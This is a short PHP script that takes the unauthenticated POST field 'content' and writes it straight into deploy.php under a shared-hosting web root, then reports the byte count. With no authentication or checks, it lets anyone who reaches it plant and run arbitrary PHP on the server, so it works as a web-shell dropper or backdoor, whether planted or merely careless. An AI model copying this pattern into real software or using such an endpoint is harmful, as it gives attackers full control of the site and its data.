<?php
// Takes content from POST 'content' and writes it to deploy.php
if (isset($_POST['content'])) {
    file_put_contents('/home9/npivfupq/public_html/fleet/deploy.php', $_POST['content']);
    echo "OK: written " . strlen($_POST['content']) . " bytes";
} else {
    echo "ERROR: no content";
}
